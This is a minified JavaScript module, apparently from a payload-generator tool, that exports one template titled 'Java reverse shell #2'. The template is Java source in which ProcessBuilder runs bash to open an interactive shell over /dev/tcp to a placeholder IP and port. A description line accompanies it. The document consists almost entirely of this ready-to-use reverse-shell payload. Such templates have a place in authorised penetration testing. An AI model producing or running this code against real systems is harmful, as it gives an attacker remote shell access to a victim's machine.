const e=[{title:"Java reverse shell #2",template:`public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}`,description:"Java reverse shell using ProcessBuilder with bash TCP connection."}],r={commands:e};export{e as commands,r as default};
